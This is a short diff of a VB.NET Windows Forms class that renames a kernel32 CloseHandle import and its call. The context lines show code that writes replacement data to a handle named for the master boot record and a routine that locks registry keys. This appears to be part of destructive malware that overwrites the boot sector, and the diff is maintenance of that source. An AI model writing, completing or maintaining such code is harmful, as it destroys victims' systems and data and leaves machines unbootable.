@@ -399,7 +399,7 @@ Public Class Form2
     End Function
 
     <DllImport("kernel32")>
-    Private Shared Function CloseHandleForm2(hObject As IntPtr) As Boolean
+    Private Shared Function CloseHandle(hObject As IntPtr) As Boolean
     End Function
 
     Private Sub LockRegistryKeyForm2(keyPath As String)
@@ -529,7 +529,7 @@ Public Class Form2
         Dim bytesWritten As UInteger = 0
         WriteFile(mbrHandle, mbrData, MbrSize, bytesWritten, IntPtr.Zero)
         ' Close the handle
-        CloseHandleForm2(mbrHandle)
+        CloseHandle(mbrHandle)
 
         ' Delete the temporary file
         If File.Exists(tempFilePath) Then
